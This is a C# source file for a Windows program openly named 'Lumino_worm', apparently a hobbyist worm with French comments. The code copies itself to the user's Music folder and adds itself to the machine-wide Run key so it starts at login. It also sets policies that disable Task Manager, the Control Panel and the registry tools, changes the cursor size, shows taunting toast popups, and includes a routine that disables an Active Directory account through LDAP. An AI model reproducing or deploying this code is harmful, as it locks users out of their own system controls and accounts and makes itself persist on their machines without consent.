using Microsoft.Win32;
using System;
using System.Windows.Forms;
using MSG_BoxCustom;
using System.Runtime.InteropServices;
using Check;
using ASCII;
using Copy;
using System.IO;
using System.Threading;
using System.DirectoryServices;
using Lumino_worm.Properties;
using TaskICO_all;
using Microsoft.Toolkit.Uwp.Notifications;
using System.Diagnostics;

namespace Lumino_worm
{
    public partial class Form1 : Form
    {

        
        public Form1()
        {
            InitializeComponent2();
        }

        public void del_user()
        {
            // Connexion à l'annuaire

            DirectoryEntry Ldap = new DirectoryEntry("LDAP://votre-nom-AD", "Login", "Password");

            // Nouvel objet pour instancier la recherche

            DirectorySearcher searcher = new DirectorySearcher(Ldap);

            SearchResult result = searcher.FindOne();

            // On récupère l'objet trouvé lors de la recherche

            DirectoryEntry DirEntry = result.GetDirectoryEntry();

            // On modifie la propriété description de l'utilisateur TEST

            DirEntry.Properties["description"].Value = "The power of WORM ";

            DirEntry.Properties["userAccountControl"].Value = 0x0002; ;



            // On envoie les changements à Active Directory

            DirEntry.CommitChanges();
        }
        public void Disable_Parameter()
        {
            try
            {

                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                       @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                objRegistryKey.GetValue("NoControlPanel");
                objRegistryKey.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);
                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }
        }
       
        public void Disble_Taskmgr()
        {
            try
            {

                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                objRegistryKey.GetValue("DisableTaskMgr");
                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }

        }


        public void Disble_Registry()
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                objRegistryKey.GetValue("Disable Registry");
                objRegistryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);

                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }

        }
        public void StartOnWinStartup()
        {
            try
            {
                RegistryKey objRegistryKey = Registry.LocalMachine.CreateSubKey(
       @"Software\Microsoft\Windows\CurrentVersion\Run");
                objRegistryKey.GetValue("LuminoWorm");
                objRegistryKey.SetValue("Lumino", "%USERPROFILE%\\Music\\Lumino_worm.exe", RegistryValueKind.String);

                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }


        }
       
        MSG_BoxCustom1 msg_boxCustom = new MSG_BoxCustom1();

        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
        private readonly Check_worm Check_file = new Check_worm();
        private readonly ASCII_class ASCII = new ASCII_class();
        private readonly Copy_Class Copy = new Copy_Class();



        readonly string userName = Environment.UserName;

        Check_class Check_all = new Check_class();
        Notify notify = new Notify();

        
        private void Worm_Load(object sender, EventArgs e)
        {
            string cbCursorSize = "1";
            int cursorSize = Int32.Parse(cbCursorSize);
            string user_dir = @"C:\Users\" + userName;
            int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
            //Enum Music = new Enum();                            |
            //Thread Music_play = new Thread(Music.Enum_music);   | PLUS DE MUSIQUE !
            TaskICO Icon = new TaskICO();
            Thread Icon_Active = new Thread(Icon.Show);
            Thread Notify_Icon = new Thread(notify.Notify_popup);
            Icon_Active.Start();
            // Music_play.Start();
            Notify_Icon.Start();
            SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
            StartOnWinStartup();
            //Verifi();
        }
      
       

        public void un()
        {
            msg_boxCustom.Show();
        }
        public void deux()
        {
            ASCII.ASCII_Art();
        }
        public void trois()
        {
            Copy.Copy_Worm("Lumino_worm.exe");
        }
        public void cuatro()
        {
            Thread Check = new Thread(Check_all.Check_copy_Form1);
            Check.Start();
        }


        readonly string computerName = System.Environment.MachineName.ToString();
        public void Verifi()
        {
            

            if (File.Exists(@"C:\Users\" + userName + @"\Music\Lumino_worm.exe"))
            {
                StartOnWinStartup();
                cuatro();
            }
            else 
            {
                un();
                deux();
                trois();
                Disable_Parameter();
                // Disble_Registry();
                StartOnWinStartup();
                Disble_Taskmgr();
                cuatro();
            }
        }
        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(120, 13);
            this.Name = "Form1";
            this.TopMost = true;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);

        }

        private void Form1_Load(object sender, EventArgs e)
        {
          
        }

       
    }

    public class Check_class
    {
        Check_worm Check_all = new Check_worm();
     public void Check_copy_Form1()
        {
            Check_all.copy_checkworm("Lumino_worm.exe");
        }
    }

    public class Notify
    {
        public void Notify_popup()
        {
            string path = Resources.logo_LS.ToString();
            new ToastContentBuilder()
                .AddText("WORM IS HERE")
    .AddText("LUMINO IS HERE!")
    .Show();

            Thread.Sleep(32000);

            new ToastContentBuilder()
                .AddText("This is the end")
    .Show();
        }
    }
    public class Enum
    {
        /* AFIN D'ÉVITEZ LA NECESSITER DES MUSIQUES !
        
        public void Enum_music()
        {


            int t = 2;
            while (t > 1)
            {
                player2.Play();
                System.Threading.Thread.Sleep(300000);

                player15.Play();
                System.Threading.Thread.Sleep(189000);

                player14.Play();
                System.Threading.Thread.Sleep(180000);

                player13.Play();
                System.Threading.Thread.Sleep(202200);

                player12.Play();
                System.Threading.Thread.Sleep(240000);

                player11.Play();
                System.Threading.Thread.Sleep(180000);

                player10.Play();
                System.Threading.Thread.Sleep(180000);

                player9.Play();
                System.Threading.Thread.Sleep(180000);

                player8.Play();
                System.Threading.Thread.Sleep(220000);

                player7.Play();
                System.Threading.Thread.Sleep(198000);

                player6.Play();
                System.Threading.Thread.Sleep(220000);

                player5.Play();
                System.Threading.Thread.Sleep(180000);

                player4.Play();
                System.Threading.Thread.Sleep(150000);

                player3.Play();
                System.Threading.Thread.Sleep(170000);

                player1.Play();
                System.Threading.Thread.Sleep(216000);


                t = t++;
            }

        }
        System.Media.SoundPlayer player15 = new System.Media.SoundPlayer(Resources.Natural);
        System.Media.SoundPlayer player14 = new System.Media.SoundPlayer(Resources.Understand);
        System.Media.SoundPlayer player13 = new System.Media.SoundPlayer(Resources.World_smallest_violion);
        System.Media.SoundPlayer player12 = new System.Media.SoundPlayer(Resources.The_White_Stripes___Seven_Nation_Army);
        System.Media.SoundPlayer player11 = new System.Media.SoundPlayer(Resources.Toxic_BoyWithUke);
        System.Media.SoundPlayer player10 = new System.Media.SoundPlayer(Resources.RUSH_E1);
        System.Media.SoundPlayer player9 = new System.Media.SoundPlayer(Resources.FNAF);
        System.Media.SoundPlayer player8 = new System.Media.SoundPlayer(Resources.Dance_Monkey);
        System.Media.SoundPlayer player7 = new System.Media.SoundPlayer(Resources.Mad_World);
        System.Media.SoundPlayer player6 = new System.Media.SoundPlayer(Resources.Sweet);
        System.Media.SoundPlayer player5 = new System.Media.SoundPlayer(Resources.Bella_Ciao);
        System.Media.SoundPlayer player4 = new System.Media.SoundPlayer(Resources.Rush_E);
        System.Media.SoundPlayer player3 = new System.Media.SoundPlayer(Resources.Sea_Chanty);
        System.Media.SoundPlayer player2 = new System.Media.SoundPlayer(Resources.Adele);
        System.Media.SoundPlayer player1 = new System.Media.SoundPlayer(Resources.believer);
    */
    
    }
    
}

